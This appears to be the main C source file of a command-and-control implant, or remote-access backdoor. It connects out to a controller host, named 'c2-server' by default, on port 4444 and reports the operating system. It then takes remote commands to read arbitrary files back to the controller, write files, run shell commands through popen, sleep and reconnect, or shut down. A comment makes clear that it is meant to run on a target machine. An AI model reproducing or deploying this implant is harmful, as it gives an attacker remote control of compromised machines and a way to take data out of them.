
#include <stdio.h>

#include <string.h>
#include "protocol.h"
#include <stdlib.h>
#include "implant_utils.h"
#include "platform.h"
int connect_to_controller()
{

    int implant_fd = socket(AF_INET, SOCK_STREAM, 0);

    if (implant_fd < 1)
    {
        perror("socket"); // fix this, we do not want to print an error on the TARGET MACHINE
        return -1;
    }

    struct sockaddr_in controller_ip_structure;

    const char *CONTROLLER_IP_ADDR = getenv("C2_HOST");
    const char *controller_port = getenv("C2_PORT");

#ifndef C2_DEFAULT_HOST
#define C2_DEFAULT_HOST "c2-server"
#endif

    if (CONTROLLER_IP_ADDR == NULL || CONTROLLER_IP_ADDR[0] == '\0') {
        CONTROLLER_IP_ADDR = C2_DEFAULT_HOST;
    }

    int port_num = 4444;
    if (controller_port != NULL && controller_port[0] != '\0') {
        int p = atoi(controller_port);
        if (p > 0) {
            port_num = p;
        }
    }

    memset(&controller_ip_structure, 0, sizeof(controller_ip_structure));
    controller_ip_structure.sin_family = AF_INET;
    controller_ip_structure.sin_port = htons(port_num);

    if (inet_pton(AF_INET, CONTROLLER_IP_ADDR, &controller_ip_structure.sin_addr) <= 0)
    {
        struct hostent *host = gethostbyname(CONTROLLER_IP_ADDR);
        if (host == NULL || host->h_addr_list == NULL || host->h_addr_list[0] == NULL) {
            perror("inet_pton/gethostbyname");
            CLOSE_SOCKET(implant_fd);
            return -1;
        }
        memcpy(&controller_ip_structure.sin_addr, host->h_addr_list[0], host->h_length);
    }

    if ((connect(implant_fd, (struct sockaddr *)&controller_ip_structure, sizeof(controller_ip_structure))) < 0)
    {
        perror("send:");
        CLOSE_SOCKET(implant_fd);
        return -1;
    }

    printf("<Succesfully connected to Controller!\n");

    printf("<Sending initial HELLO......>\n");

    char *os_info = operating_system_info();

    Packet initial_hello = {COMMAND_HELLO, 0, strlen(os_info), os_info};

    if (send_packet(&initial_hello, implant_fd) == 0)
    {

        // sending the client hello did not work close the implant
        printf("ERROR!");
        free(os_info);
        CLOSE_SOCKET(implant_fd);
        return -1;
    }

    free(os_info);

    return implant_fd; // returned the socket file descriptor
}

int main(int argc, char **argv)
{

    platform_init();

    int implant_fd = connect_to_controller();

    if (implant_fd == -1)
    {

        return 1;
    }

    // if we got here then the client hello was sent and we start our loop

    int shutdown = 0;

    while (!shutdown)
    {

        Packet *recieved_packet = recieve_packet(implant_fd);

        if (recieved_packet == NULL)
        {

            CLOSE_SOCKET(implant_fd);
            return 1;
        }

        switch (recieved_packet->command_type)
        {
        case COMMAND_HEARTBEAT:
        {
            char *payload = "ALIVE";
            Packet response = {COMMAND_RESPONSE, recieved_packet->request_id, strlen(payload), payload};
            send_packet(&response, implant_fd);

            break;
        }
        case COMMAND_SET_SLEEP:
        {

            // need to sleep, close sockt connection then reconnect after the set sleep in seconds in the payload
            int sleep_duration = *(int *)recieved_packet->payload;

            char buffer[100];
            snprintf(buffer, sizeof(buffer), "Sleeping for %d seconds......", sleep_duration);

            Packet response = {COMMAND_RESPONSE, recieved_packet->request_id, strlen(buffer), buffer};
            send_packet(&response, implant_fd);
            CLOSE_SOCKET(implant_fd);
            SLEEP(sleep_duration); // sleep for that duration
            printf("Returned from sleeping for %d seconds \n", sleep_duration);
            implant_fd = connect_to_controller();

            if (implant_fd == -1)
            {
                return 1; // error
            }

            break;
        }

        case COMMAND_SHUTDOWN:
        {
            char *payload = "SUCCESFULLY SHUTDOWN";
            Packet response = {COMMAND_RESPONSE, recieved_packet->request_id, strlen(payload), payload};
            send_packet(&response, implant_fd);
            shutdown = 1;

            break;
        }
        case COMMAND_READ_DATA:
        {

            char path[recieved_packet->payload_len + 1];
            memcpy(path, recieved_packet->payload, recieved_packet->payload_len);
            path[recieved_packet->payload_len] = '\0'; // append the null terminator to the string

            FILE *fp = fopen(path, "r");

            if (fp == NULL)
            {

                char *error_msg = "file not found";
                Packet error = {
                    COMMAND_ERROR,
                    recieved_packet->request_id,
                    strlen(error_msg),
                    error_msg};
                send_packet(&error, implant_fd);
            }
            else
            {

                char output[4096];
                int bytes_read = fread(output, 1, sizeof(output), fp);

                Packet response = {COMMAND_RESPONSE, recieved_packet->request_id, bytes_read, output};
                send_packet(&response, implant_fd);
                fclose(fp);
            }

            break;
        }
        case COMMAND_WRITE_DATA:

        {

            // Payload format for write data: [path_len (4 bytes)][file path][file contents...]
            char *payload = recieved_packet->payload;

            int path_len = (*(int *)payload);

            char path[path_len + 1];

            memcpy(path, payload + 4, path_len);
            path[path_len] = '\0';

            char *contents = payload + 4 + path_len;
            int content_length = recieved_packet->payload_len - 4 - path_len;

            FILE *fp = fopen(path, "w");

            if (fp == NULL)
            {

                char *error_msg = "file not created/found";
                Packet error = {
                    COMMAND_ERROR,
                    recieved_packet->request_id,
                    strlen(error_msg),
                    error_msg};
                send_packet(&error, implant_fd);
            }
            else
            {

                fwrite(contents, 1, content_length, fp);

                Packet response = {COMMAND_RESPONSE, recieved_packet->request_id, 0, NULL};
                send_packet(&response, implant_fd);
                fclose(fp);
            }

            break;
        }
        case COMMAND_RUN_CMD:
        {

            char cmd[recieved_packet->payload_len + 1];
            memcpy(cmd, recieved_packet->payload, recieved_packet->payload_len);
            cmd[recieved_packet->payload_len] = '\0'; // append the null terminator to the string

            FILE *fp = POPEN(cmd, "r"); // call the command

            if (fp == NULL)
            {

                char *error_msg = "file not found";
                Packet error = {
                    COMMAND_ERROR,
                    recieved_packet->request_id,
                    strlen(error_msg),
                    error_msg};
                send_packet(&error, implant_fd);
            }
            else
            {

                char output[4096];
                int bytes_read = fread(output, 1, sizeof(output), fp);

                Packet response = {COMMAND_RESPONSE, recieved_packet->request_id, bytes_read, output};
                send_packet(&response, implant_fd);
                PCLOSE(fp);
            }

            break;
        }
        default:
            break;
        }
    }

    CLOSE_SOCKET(implant_fd); // close the implant file descriptors on close
    platform_cleanup();
    return 0;
}
